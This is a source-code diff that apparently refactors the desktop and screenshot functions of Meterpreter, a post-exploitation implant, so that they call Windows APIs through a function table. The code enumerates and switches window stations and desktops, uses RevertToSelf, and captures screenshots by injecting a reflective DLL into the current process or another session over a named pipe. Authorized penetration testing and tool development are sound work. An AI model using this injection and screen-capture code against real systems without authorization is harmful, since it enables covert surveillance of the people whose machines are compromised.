@@ -32,7 +32,7 @@ BOOL CALLBACK desktop_enumdesktops_callback(LPTSTR cpDesktopName, LPARAM lpParam
 			break;
 		}
 
-		dwSessionId = htonl(dl->dwSessionId);
+		dwSessionId = met_api->win_api.ws2_32.htonl(dl->dwSessionId);
 
 		entry[0].header.type = TLV_TYPE_DESKTOP_SESSION;
 		entry[0].header.length = sizeof(DWORD);
@@ -63,23 +63,23 @@ BOOL CALLBACK desktop_enumstations_callback(LPTSTR cpStationName, LPARAM param)
 
 	do
 	{
-		hWindowStation = OpenWindowStation(cpStationName, FALSE, MAXIMUM_ALLOWED); // WINSTA_ALL_ACCESS
+		hWindowStation = met_api->win_api.user32.OpenWindowStationA(cpStationName, FALSE, MAXIMUM_ALLOWED); // WINSTA_ALL_ACCESS
 		if (!hWindowStation)
 		{
 			break;
 		}
 
-		dl.dwSessionId = session_id(GetCurrentProcessId());
+		dl.dwSessionId = session_id(met_api->win_api.kernel32.GetCurrentProcessId());
 		dl.response = (Packet *)param;
 		dl.cpStationName = cpStationName;
 
-		EnumDesktops(hWindowStation, desktop_enumdesktops_callback, (LPARAM)&dl);
+		met_api->win_api.user32.EnumDesktopsA(hWindowStation, desktop_enumdesktops_callback, (LPARAM)&dl);
 
 	} while (0);
 
 	if (hWindowStation)
 	{
-		CloseWindowStation(hWindowStation);
+		met_api->win_api.user32.CloseWindowStation(hWindowStation);
 	}
 
 	return TRUE;
@@ -101,7 +101,7 @@ DWORD request_ui_desktop_enum(Remote * remote, Packet * request)
 			BREAK_WITH_ERROR("[UI] desktop_enum. met_api->packet.create_response failed", ERROR_INVALID_HANDLE);
 		}
 
-		EnumWindowStations(desktop_enumstations_callback, (LPARAM)response);
+		met_api->win_api.user32.EnumWindowStationsA(desktop_enumstations_callback, (LPARAM)response);
 
 	} while (0);
 
@@ -179,7 +179,7 @@ DWORD request_ui_desktop_set(Remote * remote, Packet * request)
 
 		if (dwSessionId == -1)
 		{
-			dwSessionId = session_id(GetCurrentProcessId());
+			dwSessionId = session_id(met_api->win_api.kernel32.GetCurrentProcessId());
 		}
 
 		cpStationName = met_api->packet.get_tlv_value_string(request, TLV_TYPE_DESKTOP_STATION);
@@ -199,14 +199,14 @@ DWORD request_ui_desktop_set(Remote * remote, Packet * request)
 		dprintf("[UI] desktop_set: Session %d\\%s\\%s (bSwitch=%d)", dwSessionId, cpStationName, cpDesktopName, bSwitch);
 
 		// If we are switching desktop in our own session we proceed with the normal Windows API
-		if (dwSessionId == session_id(GetCurrentProcessId()))
+		if (dwSessionId == session_id(met_api->win_api.kernel32.GetCurrentProcessId()))
 		{
-			hWindowStation = OpenWindowStation(cpStationName, FALSE, WINSTA_ALL_ACCESS); // WINSTA_ALL_ACCESS MAXIMUM_ALLOWED
+			hWindowStation = met_api->win_api.user32.OpenWindowStationA(cpStationName, FALSE, WINSTA_ALL_ACCESS); // WINSTA_ALL_ACCESS MAXIMUM_ALLOWED
 			if (!hWindowStation)
 			{
-				if (RevertToSelf())
+				if (met_api->win_api.advapi32.RevertToSelf())
 				{
-					hWindowStation = OpenWindowStation(cpStationName, FALSE, WINSTA_ALL_ACCESS);
+					hWindowStation = met_api->win_api.user32.OpenWindowStationA(cpStationName, FALSE, WINSTA_ALL_ACCESS);
 				}
 			}
 
@@ -215,29 +215,29 @@ DWORD request_ui_desktop_set(Remote * remote, Packet * request)
 				BREAK_WITH_ERROR("[UI] desktop_set. Couldnt get the new Window Station", ERROR_INVALID_HANDLE);
 			}
 
-			hOrigWindowStation = GetProcessWindowStation();
+			hOrigWindowStation = met_api->win_api.user32.GetProcessWindowStation();
 
-			if (!SetProcessWindowStation(hWindowStation))
+			if (!met_api->win_api.user32.SetProcessWindowStation(hWindowStation))
 			{
-				BREAK_ON_ERROR("[UI] desktop_set. SetProcessWindowStation failed");
+				BREAK_WITH_ERROR("[UI] desktop_set. SetProcessWindowStation failed", met_api->win_api.kernel32.GetLastError());
 			}
 
-			hDesktop = OpenDesktop(cpDesktopName, 0, FALSE, GENERIC_ALL);
+			hDesktop = met_api->win_api.user32.OpenDesktopA(cpDesktopName, 0, FALSE, GENERIC_ALL);
 			if (!hDesktop)
 			{
-				BREAK_ON_ERROR("[UI] desktop_set. OpenDesktop failed");
+				BREAK_WITH_ERROR("[UI] desktop_set. OpenDesktop failed", met_api->win_api.kernel32.GetLastError());
 			}
 
-			if (!SetThreadDesktop(hDesktop))
+			if (!met_api->win_api.user32.SetThreadDesktop(hDesktop))
 			{
-				BREAK_ON_ERROR("[UI] desktop_set. SetThreadDesktop failed");
+				BREAK_WITH_ERROR("[UI] desktop_set. SetThreadDesktop failed", met_api->win_api.kernel32.GetLastError());
 			}
 
 			if (bSwitch)
 			{
-				if (!SwitchDesktop(hDesktop))
+				if (!met_api->win_api.user32.SwitchDesktop(hDesktop))
 				{
-					BREAK_ON_ERROR("[UI] desktop_set. SwitchDesktop failed");
+					BREAK_WITH_ERROR("[UI] desktop_set. SwitchDesktop failed", met_api->win_api.kernel32.GetLastError());
 				}
 			}
 
@@ -258,17 +258,17 @@ DWORD request_ui_desktop_set(Remote * remote, Packet * request)
 
 	if (hDesktop)
 	{
-		CloseDesktop(hDesktop);
+		met_api->win_api.user32.CloseDesktop(hDesktop);
 	}
 
 	if (hWindowStation)
 	{
-		CloseWindowStation(hWindowStation);
+		met_api->win_api.user32.CloseWindowStation(hWindowStation);
 	}
 
 	if (hOrigWindowStation)
 	{
-		SetProcessWindowStation(hOrigWindowStation);
+		met_api->win_api.user32.SetProcessWindowStation(hOrigWindowStation);
 	}
 
 	if (dwResult != ERROR_SUCCESS)
@@ -313,10 +313,10 @@ DWORD THREADCALL desktop_screenshot_thread(THREAD * thread)
 		dprintf("[UI] desktop_screenshot_thread. cpNamedPipe=%s", cpNamedPipe);
 
 		// create the named pipe for the client service to connect to
-		hServerPipe = CreateNamedPipe(cpNamedPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, NULL);
+		hServerPipe = met_api->win_api.kernel32.CreateNamedPipeA(cpNamedPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, NULL);
 		if (!hServerPipe)
 		{
-			BREAK_ON_ERROR("[UI] desktop_screenshot_thread. CreateNamedPipe failed");
+			BREAK_WITH_ERROR("[UI] desktop_screenshot_thread. CreateNamedPipe failed", met_api->win_api.kernel32.GetLastError());
 		}
 
 		while (TRUE)
@@ -327,16 +327,16 @@ DWORD THREADCALL desktop_screenshot_thread(THREAD * thread)
 			}
 
 			// wait for a client to connect to our named pipe...
-			if (!ConnectNamedPipe(hServerPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED)
+			if (!met_api->win_api.kernel32.ConnectNamedPipe(hServerPipe, NULL) && met_api->win_api.kernel32.GetLastError() != ERROR_PIPE_CONNECTED)
 			{
 				continue;
 			}
 
 			dprintf("[UI] desktop_screenshot_thread. got client conn.");
 
-			if (!ReadFile(hServerPipe, &dwLength, sizeof(DWORD), &dwRead, NULL))
+			if (!met_api->win_api.kernel32.ReadFile(hServerPipe, &dwLength, sizeof(DWORD), &dwRead, NULL))
 			{
-				BREAK_ON_ERROR("[UI] desktop_screenshot_thread. ReadFile 1 failed");
+				BREAK_WITH_ERROR("[UI] desktop_screenshot_thread. ReadFile 1 failed", met_api->win_api.kernel32.GetLastError());
 			}
 
 			// a client can send a zero length to indicate that it cant get a screenshot.
@@ -355,18 +355,18 @@ DWORD THREADCALL desktop_screenshot_thread(THREAD * thread)
 			{
 				DWORD dwAvailable = 0;
 
-				if (!PeekNamedPipe(hServerPipe, NULL, 0, NULL, &dwAvailable, NULL))
+				if (!met_api->win_api.kernel32.PeekNamedPipe(hServerPipe, NULL, 0, NULL, &dwAvailable, NULL))
 				{
 					break;
 				}
 
 				if (!dwAvailable)
 				{
-					Sleep(100);
+					met_api->win_api.kernel32.Sleep(100);
 					continue;
 				}
 
-				if (!ReadFile(hServerPipe, (LPVOID)(pBuffer + dwTotal), (dwLength - dwTotal), &dwRead, NULL))
+				if (!met_api->win_api.kernel32.ReadFile(hServerPipe, (LPVOID)(pBuffer + dwTotal), (dwLength - dwTotal), &dwRead, NULL))
 				{
 					break;
 				}
@@ -383,8 +383,14 @@ DWORD THREADCALL desktop_screenshot_thread(THREAD * thread)
 
 	if (hServerPipe)
 	{
-		DisconnectNamedPipe(hServerPipe);
-		CLOSE_HANDLE(hServerPipe);
+		DWORD dwHandleFlags;
+
+		met_api->win_api.kernel32.DisconnectNamedPipe(hServerPipe);
+		if (met_api->win_api.kernel32.GetHandleInformation(hServerPipe, &dwHandleFlags))
+		{
+			met_api->win_api.kernel32.CloseHandle(hServerPipe);
+		}
+		hServerPipe = NULL;
 	}
 
 	SAFE_FREE(pBuffer);
@@ -444,13 +450,13 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		}
 
 		// get the session id that our host process belongs to
-		dwCurrentSessionId = session_id(GetCurrentProcessId());
+		dwCurrentSessionId = session_id(met_api->win_api.kernel32.GetCurrentProcessId());
 
 		// get the session id for the interactive session
 		dwActiveSessionId = session_activeid();
 
 		// create a uniuqe pipe name for our named pipe server
-		dwPipeName = GetTickCount();
+		dwPipeName = met_api->win_api.kernel32.GetTickCount();
 
 		_snprintf(cNamedPipe, MAX_PATH, "\\\\.\\pipe\\%08X", dwPipeName);
 
@@ -471,7 +477,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 			BREAK_WITH_ERROR("[UI] desktop_screenshot. met_api->thread.run failed", ERROR_ACCESS_DENIED);
 		}
 
-		Sleep(500);
+		met_api->win_api.kernel32.Sleep(500);
 
 		// do the local process or session injection
 		if (dwCurrentSessionId != dwActiveSessionId)
@@ -485,7 +491,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		else
 		{
 			dprintf("[UI] desktop_screenshot. Allready in the active session %d.\n", dwActiveSessionId);
-			if (ps_inject(GetCurrentProcessId(), &dllBuffer, reflectiveLoader, cCommandLine) != ERROR_SUCCESS)
+			if (ps_inject(met_api->win_api.kernel32.GetCurrentProcessId(), &dllBuffer, reflectiveLoader, cCommandLine) != ERROR_SUCCESS)
 			{
 				BREAK_WITH_ERROR("[UI] desktop_screenshot. ps_inject current process failed", ERROR_ACCESS_DENIED);
 			}
@@ -494,7 +500,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		// Wait for at most 30 seconds for the screenshot to happen...
 		// If we have injected our code via APC injection, it may take a while for the target
 		// thread to enter an alertable state and get our queued APC executed.
-		WaitForSingleObject(pPipeThread->handle, 30000);
+		met_api->win_api.kernel32.WaitForSingleObject(pPipeThread->handle, 30000);
 
 		// signal our thread to terminate if it is still running.
 		met_api->thread.sigterm(pPipeThread);
@@ -503,7 +509,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		met_api->thread.join(pPipeThread);
 
 		// get the exit code for our pthread
-		if (!GetExitCodeThread(pPipeThread->handle, &dwResult))
+		if (!met_api->win_api.kernel32.GetExitCodeThread(pPipeThread->handle, &dwResult))
 		{
 			BREAK_WITH_ERROR("[UI] desktop_screenshot. GetExitCodeThread failed", ERROR_INVALID_HANDLE);
 		}
